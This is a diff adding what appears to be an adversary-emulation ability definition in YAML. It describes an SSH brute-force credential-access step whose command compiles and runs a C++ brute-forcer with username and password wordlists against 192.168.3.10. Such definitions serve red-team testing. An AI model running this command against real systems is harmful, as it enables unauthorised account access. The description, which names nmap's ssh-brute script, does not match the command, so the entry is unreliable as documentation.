@@ -1,0 +1,37 @@
+- tactic: credential-access
+  technique_name: 'Remote Services: SSH'
+  technique_id: TB009
+  name: SSH Brute Force
+  description: Using nmap's ssh-brute script and two text files containing common
+    usernames and passwords, this ability finds out if a (username, password) pair
+    exists in the target system
+  executors:
+  - name: sh
+    platform: linux
+    command: g++ -std=c++11 ssh_brute_force.cpp -o /tmp/ssh_brute_force; mv usernames.txt
+      /tmp/usernames.txt; mv passwords.txt /tmp/passwords.txt; /tmp/ssh_brute_force
+      192.168.3.10
+    code: null
+    language: null
+    build_target: null
+    payloads:
+    - usernames.txt
+    - passwords.txt
+    - ssh_brute_force.cpp
+    uploads: []
+    timeout: 600
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - credential-access
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: de3bd47f-a0f5-4332-97d7-159c267c2ccf
